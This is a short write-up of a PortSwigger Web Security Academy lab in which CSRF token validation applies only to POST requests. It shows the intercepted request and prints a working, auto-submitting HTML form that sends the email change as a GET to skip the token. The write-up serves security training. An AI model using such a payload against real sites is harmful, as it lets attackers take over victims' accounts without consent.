# Lab Writeup: CSRF where token validation depends on request method

URL: https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

## Description

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login using `wiener:peter`
2. Try changing the email address then intercept using burp:

   ![csrf-req-method](/assets/csrf-req-method.png)

   From the above intercepted request and response, we know that the URL to change the email is `/my-account/change-email` with the method `POST` we could also see that a **CSRF token** is required to do the `POST` request

3. Create the following payload:

   ```html
   <!DOCTYPE html>
   <html>
     <body>
       <form
         action="https://0a0f00650315d4d88045b73d00f8004f.web-security-academy.net/my-account/change-email"
         method="GET"
       >
         <input type="text" name="email" value="hacker@gmail.com" />
       </form>
       <script type="text/javascript">
         // automatically submits form on display
         document.forms[0].submit();
       </script>
     </body>
   </html>
   ```

   From the above payload, we know that the request type is `GET` which bypasses the required CSRF token

4. Store, send exploit to victim and the lab should be solved:

   ![csrf-req-method-1](/assets/csrf-req-method-1.png)
